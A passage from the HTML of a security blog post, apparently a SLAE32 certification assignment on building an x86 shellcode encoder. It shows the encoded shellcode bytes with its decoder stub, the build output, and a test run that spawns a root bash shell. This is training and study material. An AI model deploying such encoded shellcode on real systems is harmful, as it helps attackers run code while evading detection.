class="s2">7d</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">97"</span>
<span class="o">[</span>+] ASM code: 0xeb,0x17,0x5e,0x31,0xc9,0x31,0xd2,0xb2,0x1e,0x39,0xd1,0x74,0x11,0x80,0x36,0x11,0xfe,0x0e,0x80,0x36,0x05,0x46,0x41,0xeb,0xf0,0xe8,0xe4,0xff,0xff,0xff,0x24,0xd7,0x47,0x7f,0x79,0x74,0x66,0x7f,0x7f,0x79,0x7c,0x7d,0x3a,0x7f,0x3a,0x3a,0x3a,0x3a,0x9c,0xf6,0x47,0x9c,0xf9,0x46,0x9c,0xf4,0xa7,0x1e,0xd8,0x97
<span class="o">[</span>+] Creating File: shellcode.c
<span class="o">[</span>+] Compiling Executable: shellcode
<span class="o">[</span>+] Enjoy!
</pre></table></code></div></div><p>By running the compiled binary (<code class="language-plaintext highlighter-rouge">shellcode</code>), we can confirm the <code class="language-plaintext highlighter-rouge">decoder.nasm</code> successfully decode our XOR-Increment-XOR encoding scheme and run the expected command of <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># ./shellcode </span>
root@kali:/root# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@kali:/root#
</pre></table></code></div></div><p><b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b></p><p><b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b></p><p><b>Student ID: SLAE-1542</b></p><p><a href="https://github.com/bigb0sss/SLAE32">SLAE32 Assignemt#4 Github</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae32/'>SLAE32</a>, <a href='/categories/assignment_4_encoder/'>Assignment_4_Encoder</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/slae32/" class="post-tag no-text-decoration" >slae32</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/x86/" class="post-tag no-text-decoration" >x86</a> <a href="/tags/encoder/" class="post-tag no-text-decoration" >Encoder</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/slae32-assignment-4/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=SLAE32 - Assignment#4 [Encoder] - bigb0ss&url=https://bigb0sss.github.io/posts/slae32-assignment-4/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE32 - Assignment#4 [Encoder] - bigb0ss&u=https://bigb0sss.github.io/posts/slae32-assignment-4/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=SLAE32 - Assignment#4 [Encoder] - bigb0ss&url=https://bigb0sss.github.io/posts/slae32-assignment-4/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/redteam-cobalt-strike-malleable-profile/">Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/slae32-assignment-1/"><div class="card-body"> <span class="timeago small" > Dec 12, 2020 <i class="unloaded">2020-12-12T00:26:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#1 [Bind TCP Shell]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-assignment-2/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T10:53:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#2 [Reverse TCP Shell]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-assignment-3/"><div class="card-body"> <span class="timeago small" > Dec 26, 2020 <i class="unloaded">2020-12-26T10:53:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32 - Assignment#3 [Egghunter]</h3><div class="text-muted small"><p> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/slae32-assignment-3/" class="btn btn-outline-primary"><p>SLAE32 - Assignment#3 [Egghunter]</p></a> <a href="/posts/slae32-assignment-5/" class="btn btn-outline-primary"><p>SLAE32 - Assignment#5 [Shellcode Analysis]</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/slae32-assignment-4/'; this.page.identifier = '/posts/slae32-assignment-4/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
